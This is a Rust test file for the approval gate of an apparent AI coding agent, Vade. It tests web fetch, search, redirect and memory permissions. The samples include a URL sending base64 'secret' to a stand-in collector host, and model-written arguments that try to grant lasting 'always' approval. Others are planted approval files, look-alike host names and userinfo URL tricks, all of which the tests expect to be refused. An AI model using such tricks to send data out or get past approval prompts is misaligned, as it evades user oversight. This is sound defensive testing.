    let captured = std::cell::RefCell::new(Vec::new());
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required { captured.borrow_mut().push(preview.detail.to_owned()); }
        false
    }).with_approvals(&approvals).with_web(true).with_memory(true);
    let _ = call(&mut tools, "web_fetch", r#"{"url":"https://docs.example.org/guide"}"#);
    let _ = call(&mut tools, "web_search", r#"{"query":"ownership rules"}"#);
    let _ = tools.approve_redirect("https://docs.example.org/start", "https://other.example.org/next", &cancel);
    let _ = tools.approve_redirect("https://docs.example.org/start", "http://docs.example.org/next", &cancel);
    let _ = call(&mut tools, "memory_save", r#"{"key":"build","text":"Run unit tests first."}"#);
    let _ = call(&mut tools, "memory_forget", r#"{"key":"build"}"#);
    drop(tools);
    let prompts = captured.into_inner();
    assert_eq!(prompts.len(), 6);
    for prompt in &prompts {
        let lines: Vec<_> = prompt.lines().collect();
        assert_eq!(lines.len(), 3, "expected 3 plain lines (what, why, choices): {prompt}");
        assert!(!lines[0].starts_with("web_") && !lines[0].contains("[\""), "raw tool/JSON code shown in prompt: {prompt}");
        assert!(lines[1].starts_with("Why this asks: "), "missing plain risk explanation: {prompt}");
        assert!(lines[2].starts_with("Answer y to ") && lines[2].contains(", or n to "), "missing plain yes/no outcome: {prompt}");
    }
    assert!(prompts[1].contains("s to allow web searches for this session"));
}
/// The reply of a search that passed the policy.
const SEARCH_REACHED: &str = "Web search failed: DuckDuckGo failed (network is disabled in tests)";
/// A Vade home outside the workspace, where no model tool can write.
fn outside_home() -> (Fixture, std::path::PathBuf) {
    let folder = Fixture::new();
    let home = folder.0.join("vade-home");
    (folder, home)
}
fn saved_web(home: &std::path::Path) -> Vec<String> {
    crate::saved_approvals::read(home).unwrap().web
}
/// The `a` save checks the home again: a home whose way now leads into the
/// workspace saves nothing, and the notice says why.
#[cfg(unix)]
#[test]
fn an_always_answer_saves_nothing_when_the_home_now_leads_into_the_workspace() {
    let f = Fixture::new(); let w = f.workspace();
    let (folder, _) = outside_home();
    let (real, link) = (folder.0.join("real"), folder.0.join("link"));
    std::fs::create_dir(&real).unwrap();
    std::fs::create_dir(w.root().join("sub")).unwrap();
    std::os::unix::fs::symlink(&real, &link).unwrap();
    let home = link.join("vade");
    let approvals = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), true).unwrap();
    assert!(approvals.always_note().is_none() && approvals.can_save(false));
    // Between the start and the answer the link is changed to a workspace folder.
    std::fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink(w.root().join("sub"), &link).unwrap();
    let notices = std::cell::RefCell::new(Vec::new());
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required { approvals.choose(shell::permissions::Scope::Always); } else { notices.borrow_mut().push(preview.detail.to_owned()); }
        true
    }).with_approvals(&approvals).with_web(true);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://good.example.org/a"}"#).unwrap(), FETCH_REACHED);
    drop(tools);
    assert_eq!(notices.into_inner(), [format!("Requests to the site https://good.example.org were approved for this one call only; the approval was not saved: {}", crate::home_guard::reason(&home))]);
    assert!(!w.root().join("sub/vade").exists() && !real.join("vade").exists());
    assert!(!approvals.web_allowed("https://good.example.org"));
}
#[test]
fn an_always_answer_is_saved_in_the_vade_home_for_that_exact_site_only() {
    let f = Fixture::new(); let w = f.workspace();
    let (_folder, home) = outside_home();
    let approvals = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), true).unwrap();
    assert_eq!(approvals.always_note(), None);
    // The person answers `a` at the terminal (the terminal sets the reach); the site is saved.
    let (prompts, notices) = (std::cell::RefCell::new(Vec::new()), std::cell::RefCell::new(Vec::new()));
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required {
            prompts.borrow_mut().push(preview.detail.lines().last().unwrap().to_owned());
            approvals.choose(shell::permissions::Scope::Always);
        } else {
            notices.borrow_mut().push(format!("{}: {}", preview.title, preview.detail));
        }
        true
    }).with_approvals(&approvals).with_web(true);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://good.example.org/a"}"#).unwrap(), FETCH_REACHED);
    assert!(call(&mut tools, "web_search", r#"{"query":"vade"}"#).unwrap().starts_with(SEARCH_REACHED));
    // The saved key has one spelling per site: no final dot, no leading zero
    // in a port, the short IPv6 form.
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://[2001:4860:0:0:0:0:0:8888]:0443/a"}"#).unwrap(), FETCH_REACHED);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://other.example.org.:08443/a"}"#).unwrap(), FETCH_REACHED);
    // Saved: this session asks no more.
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://good.example.org/b"}"#).unwrap(), FETCH_REACHED);
    drop(tools);
    assert_eq!(prompts.into_inner(), [
        "Answer y to send this request once, s to allow requests to https://good.example.org for this session, a to allow them always, or n to refuse without sending anything.",
        "Answer y to run this search once, s to allow web searches for this session, a to allow them always, or n to refuse without sending anything.",
        "Answer y to send this request once, s to allow requests to https://[2001:4860:0:0:0:0:0:8888]:0443 for this session, a to allow them always, or n to refuse without sending anything.",
        "Answer y to send this request once, s to allow requests to https://other.example.org.:08443 for this session, a to allow them always, or n to refuse without sending anything.",
    ]);
    assert_eq!(&notices.borrow()[..2], [
        format!("Web approval: Requests to the site https://good.example.org need no approval in this or any later session. To take this back, run: vade allowed remove 'https://good.example.org' --vade-home '{}'", home.display()),
        format!("Web approval: Requests to the search providers need no approval in this or any later session. To take this back, run: vade allowed remove 'web search' --vade-home '{}'", home.display()),
    ]);
    assert_eq!(notices.borrow()[3], format!("Web approval: Requests to the site https://other.example.org.:08443 need no approval in this or any later session. To take this back, run: vade allowed remove 'https://other.example.org:8443' --vade-home '{}'", home.display()));
    assert_eq!(saved_web(&home), ["https://good.example.org", "web search", "https://[2001:4860::8888]", "https://other.example.org:8443"]);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(home.join(crate::saved_approvals::FILE_NAME)).unwrap().permissions().mode() & 0o777, 0o600);
    }
    // A later session reads the file at start. With no one to answer, the
    // saved site and search run; every other site is refused, never sent.
    let later = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), false).unwrap();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| { assert!(!preview.approval_required); true })
        .with_approvals(&later).with_web(true);
    for url in [
        "https://good.example.org/c?d=1", "https://GOOD.example.org/d", "https://good.example.org:443/e", "https://good.example.org./f", "https://good.example.org:0443/g",
        "https://[2001:4860::8888]/", "https://[2001:4860:0::8888]:443/", "https://other.example.org:8443/", "https://OTHER.example.org.:8443/",
    ] {
        assert_eq!(call(&mut tools, "web_fetch", &format!(r#"{{"url":"{url}"}}"#)).unwrap(), FETCH_REACHED, "{url}");
    }
    assert!(call(&mut tools, "web_search", r#"{"query":"vade"}"#).unwrap().starts_with(SEARCH_REACHED));
    // One site's approval is never another's: a trailing dot, another port or
    // scheme, a longer or look-alike name, the www name, an IP form.
    for url in [
        "https://good.example.org:8443/", "http://good.example.org/", "https://good.example.org.evil.example.org/", "https://evil-good.example.org/",
        "https://goodexample.example.org/", "https://www.good.example.org/", "https://good.example.org:4430/", "https://other.example.org/",
        "http://other.example.org:8443/", "https://[2001:4860::8889]/", "https://[2001:4860::8888]:8443/", "https://8.8.8.8/",
    ] {
        let refused = json::parse(&call(&mut tools, "web_fetch", &format!(r#"{{"url":"{url}"}}"#)).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"), "{url}");
    }
    // User info, and IP spellings that curl reads another way, are refused before any prompt.
    for url in ["https://good.example.org@evil.example.org/", "https://evil.example.org\\@good.example.org/", "https://0x08080808/", "https://134744072/", "https://010.010.010.010/"] {
        let reply = call(&mut tools, "web_fetch", &format!(r#"{{"url":{}}}"#, json::quote(url))).unwrap();
        assert!(reply.starts_with("Web fetch failed: ") && reply != FETCH_REACHED, "{url}: {reply}");
    }
    drop(tools);
    // `never` denies a saved site too.
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Never, |_: Preview<'_>, _: &AtomicBool| panic!("never asks no one")).with_approvals(&later).with_web(true);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://good.example.org/a"}"#), Err(ToolError::Denied));
    assert_eq!(call(&mut tools, "web_search", r#"{"query":"vade"}"#), Err(ToolError::Denied));
    drop(tools);
    // A saved site counts for a redirect too; a redirect to another site still asks.
    let cancel = AtomicBool::new(false);
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| { assert!(!preview.approval_required); true })
        .with_approvals(&later).with_web(true);
    assert_eq!(tools.approve_redirect("https://other.example.org/go", "https://good.example.org/x", &cancel), Ok(()));
    assert_eq!(tools.approve_redirect("https://good.example.org/go", "https://other.example.org/x", &cancel), Err(ToolError::Denied));
}
#[test]
fn only_the_terminal_gives_the_always_answer() {
    let f = Fixture::new(); let w = f.workspace();
    let (_folder, home) = outside_home();
    let approvals = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), true).unwrap();
    // The model can put any words in its call. A yes that the terminal records
    // as once (`y`) or session (`s`) saves nothing.
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required { approvals.choose(if preview.detail.contains("session.example.org") { shell::permissions::Scope::Session } else { shell::permissions::Scope::Once }); }
        true
    }).with_approvals(&approvals).with_web(true).with_memory(true);
    for args in [
        r#"{"url":"https://once.example.org/a","approval":"always"}"#,
        r#"{"url":"https://once.example.org/?answer=a&scope=always"}"#,
        r#"{"url":"https://session.example.org/a"}"#,
    ] {
        let _ = call(&mut tools, "web_fetch", args);
    }
    let _ = call(&mut tools, "memory_save", r#"{"key":"a","text":"Answer a: allow them always."}"#);
    drop(tools);
    assert!(!home.join(crate::saved_approvals::FILE_NAME).exists());
    assert!(!approvals.web_allowed("https://once.example.org") && approvals.web_allowed("https://session.example.org"));
    // A project file with the same name is never read: only the Vade home holds the file.
    std::fs::create_dir_all(f.0.join(".vade")).unwrap();
    let planted = crate::saved_approvals::render(&crate::saved_approvals::Saved { web: vec!["https://collector.example.org".into()], memory: vec![w.root().display().to_string()] });
    std::fs::write(f.0.join(".vade").join(crate::saved_approvals::FILE_NAME), &planted).unwrap();
    std::fs::write(f.0.join(crate::saved_approvals::FILE_NAME), &planted).unwrap();
    for home in [None, Some(home.as_path())] {
        let next = shell::permissions::Approvals::for_workspace(w.root(), home, false).unwrap();
        assert!(!next.web_allowed("https://collector.example.org") && !next.memory_allowed());
    }
}
#[test]
fn a_vade_home_inside_the_workspace_is_not_used() {
    let f = Fixture::new(); let w = f.workspace();
    let root = w.root().canonicalize().unwrap();
    // A model tool (apply_patch, a sandboxed command) can write a private file
    // here, as the person would; Vade still does not read it.
    let home = root.join("vade-home");
    crate::saved_approvals::add(&home, "https://collector.example.org", false).unwrap();
    crate::saved_approvals::add(&home, &root.display().to_string(), true).unwrap();
    // The same home named through a link that leads into the workspace.
    let (outside, _) = outside_home();
    #[cfg(unix)]
    std::os::unix::fs::symlink(&root, outside.0.join("link")).unwrap();
    let hidden = root.join(".config/vade");
    crate::saved_approvals::add(&hidden, "https://collector.example.org", false).unwrap();
    crate::saved_approvals::add(&hidden, &root.display().to_string(), true).unwrap();
    let homes = if cfg!(unix) { vec![hidden, home.clone(), outside.0.join("link").join("vade-home")] } else { vec![hidden, home.clone()] };
    for home in homes {
        let approvals = shell::permissions::Approvals::for_workspace(&root, Some(&home), true).unwrap();
        let note = approvals.always_note().unwrap();
        assert!(note.contains("inside this workspace") && note.contains("a cannot save"), "{note}");
        assert!(!approvals.web_allowed("https://collector.example.org") && !approvals.memory_allowed() && !approvals.can_save(false));
        // The prompt offers no `a`, and an `a` that reaches the tool saves nothing.
        let (prompts, notices) = (std::cell::RefCell::new(Vec::new()), std::cell::RefCell::new(Vec::new()));
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
            if preview.approval_required {
                prompts.borrow_mut().push(preview.detail.lines().last().unwrap().to_owned());
                approvals.choose(shell::permissions::Scope::Always);
            } else {
                notices.borrow_mut().push(preview.detail.to_owned());
            }
            true
        }).with_approvals(&approvals).with_web(true);
        assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://docs.example.org/a"}"#).unwrap(), FETCH_REACHED);
        drop(tools);
        assert_eq!(prompts.into_inner(), ["Answer y to send this request once, s to allow requests to https://docs.example.org for this session, or n to refuse without sending anything."]);
        let notices = notices.into_inner();
        assert!(notices[0].starts_with("Requests to the site https://docs.example.org were approved for this one call only; the approval was not saved: ") && notices[0].contains("inside this workspace"), "{notices:?}");
        assert!(!saved_web(&home).contains(&"https://docs.example.org".to_owned()));
        // With no one to answer, the planted site is refused like any other.
        let none = shell::permissions::Approvals::for_workspace(&root, Some(&home), false).unwrap();
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| panic!("no prompt without a terminal")).with_approvals(&none).with_web(true).with_memory(true);
        let refused = json::parse(&call(&mut tools, "web_fetch", r#"{"url":"https://collector.example.org/?d=c2VjcmV0"}"#).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"));
        let refused = json::parse(&call(&mut tools, "memory_save", r#"{"key":"k","text":"t"}"#).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"));
    }
}
#[test]
fn memory_notes_take_s_for_the_session_and_a_for_always() {
    let f = Fixture::new(); let w = f.workspace();
    let (_folder, home) = outside_home();
    let approvals = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), true).unwrap();
    let (prompts, notices, answer) = (std::cell::RefCell::new(Vec::new()), std::cell::RefCell::new(Vec::new()), std::cell::Cell::new(shell::permissions::Scope::Session));
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| {
        if preview.approval_required {
            prompts.borrow_mut().push(preview.detail.lines().last().unwrap().to_owned());
            approvals.choose(answer.get());
        } else {
            notices.borrow_mut().push(format!("{}: {}", preview.title, preview.detail));
        }
        true
    }).with_approvals(&approvals).with_memory(true);
    // `s`: the save asks once; a second save and a delete in this session do not.
    assert_eq!(call(&mut tools, "memory_save", r#"{"key":"style","text":"Brief."}"#).unwrap(), r#"{"entries":1}"#);
    assert_eq!(call(&mut tools, "memory_save", r#"{"key":"tests","text":"Run them."}"#).unwrap(), r#"{"entries":2}"#);
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"style"}"#).unwrap(), r#"{"entries":1}"#);
    assert_eq!(prompts.borrow().len(), 1);
    // A new session asks again; a delete asks with the same answers.
    approvals.new_session().unwrap();
    answer.set(shell::permissions::Scope::Always);
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"tests"}"#).unwrap(), r#"{"entries":0}"#);
    drop(tools);
    assert_eq!(prompts.into_inner(), [
        "Answer y to save this note, s to allow note changes in this project for this session, a to allow them always, or n to leave project notes unchanged.",
        "Answer y to delete this note, s to allow note changes in this project for this session, a to allow them always, or n to keep project notes unchanged.",
    ]);
    let project = w.root().canonicalize().unwrap().display().to_string();
    let notices = notices.into_inner();
    assert_eq!(notices[0], "Memory approval: Memory note changes in this project need no approval for the rest of this session.");
    assert_eq!(notices.last().unwrap(), &format!("Memory approval: Memory note changes in this project need no approval in this or any later session. To take this back, run: vade allowed remove memory '{project}' --vade-home '{}'", home.display()));
    assert_eq!(crate::saved_approvals::read(&home).unwrap().memory, [project]);
    // A later session of this project changes notes with no one to answer.
    let later = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), false).unwrap();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| { assert!(!preview.approval_required); true }).with_approvals(&later).with_memory(true);
    assert_eq!(call(&mut tools, "memory_save", r#"{"key":"style","text":"Brief."}"#).unwrap(), r#"{"entries":1}"#);
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"style"}"#).unwrap(), r#"{"entries":0}"#);
    drop(tools);
    // Another project with the same Vade home still refuses; `never` still denies.
    let other = Fixture::new(); let other_w = other.workspace();
    let none = shell::permissions::Approvals::for_workspace(other_w.root(), Some(&home), false).unwrap();
    let mut tools = CodingTools::new(&other_w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| panic!("no prompt without a terminal")).with_approvals(&none).with_memory(true);
    let refused = json::parse(&call(&mut tools, "memory_save", r#"{"key":"k","text":"t"}"#).unwrap()).unwrap();
    assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"));
    drop(tools);
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Never, |_: Preview<'_>, _: &AtomicBool| panic!("never asks no one")).with_approvals(&later).with_memory(true);
    assert_eq!(call(&mut tools, "memory_save", r#"{"key":"k","text":"t"}"#), Err(ToolError::Denied));
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"k"}"#), Err(ToolError::Denied));
}
#[test]
fn full_permission_mode_runs_web_and_memory_with_no_wait() {
    // `--approval auto` (`--yes`): one line each, no answer needed, also with no terminal.
    let f = Fixture::new(); let w = f.workspace();
    let none = shell::permissions::Approvals::new(None, None, false).unwrap();
    let mut shown = Vec::new();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |preview: Preview<'_>, _: &AtomicBool| { assert!(!preview.approval_required); shown.push(preview.title); true })
        .with_approvals(&none).with_web(true).with_memory(true);
    assert_eq!(call(&mut tools, "web_fetch", r#"{"url":"https://docs.example.org/a"}"#).unwrap(), FETCH_REACHED);
    assert!(call(&mut tools, "web_search", r#"{"query":"vade"}"#).unwrap().starts_with(SEARCH_REACHED));
    assert_eq!(tools.approve_redirect("https://docs.example.org/a", "https://other.example.org/b", &AtomicBool::new(false)), Ok(()));
    assert_eq!(call(&mut tools, "memory_save", r#"{"key":"k","text":"t"}"#).unwrap(), r#"{"entries":1}"#);
    assert_eq!(call(&mut tools, "memory_forget", r#"{"key":"k"}"#).unwrap(), r#"{"entries":0}"#);
    drop(tools);
    assert_eq!(shown, ["Web request", "Web request", "Web redirect", "Memory note", "Memory note"]);
}

#[cfg(target_os = "linux")]
#[test]
fn raw_workspace_paths_cannot_share_a_saved_memory_approval() {
    use std::os::unix::ffi::OsStringExt;
    let f = Fixture::new();
    let (_outside, home) = outside_home();
    for byte in [0x80, 0x81] {
        let root = f.0.join(std::ffi::OsString::from_vec(vec![b'p', byte]));
        std::fs::create_dir(&root).unwrap();
        let w = crate::tools::Workspace::open(&root, crate::tools::StateLocation::home(home.clone()).unwrap()).unwrap();
        // A record written by the older lossy-key code must authorize neither store.
        crate::saved_approvals::add(&home, &w.root().to_string_lossy(), true).unwrap();
        let before = std::fs::read(home.join(crate::saved_approvals::FILE_NAME)).unwrap();
        let approvals = shell::permissions::Approvals::for_workspace(w.root(), Some(&home), false).unwrap();
        assert!(!approvals.memory_allowed() && !approvals.can_save(true));
        assert!(approvals.always_note().unwrap().contains("must be UTF-8"));
        assert!(approvals.save_always(None, true).is_err());
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| panic!("no terminal"))
            .with_approvals(&approvals).with_memory(true);
        let refused = json::parse(&call(&mut tools, "memory_save", r#"{"key":"style","text":"Brief."}"#).unwrap()).unwrap();
        assert_eq!(refused.get("error").and_then(Value::as_str), Some("approval_required"));
        assert_eq!(std::fs::read(home.join(crate::saved_approvals::FILE_NAME)).unwrap(), before);
    }
}
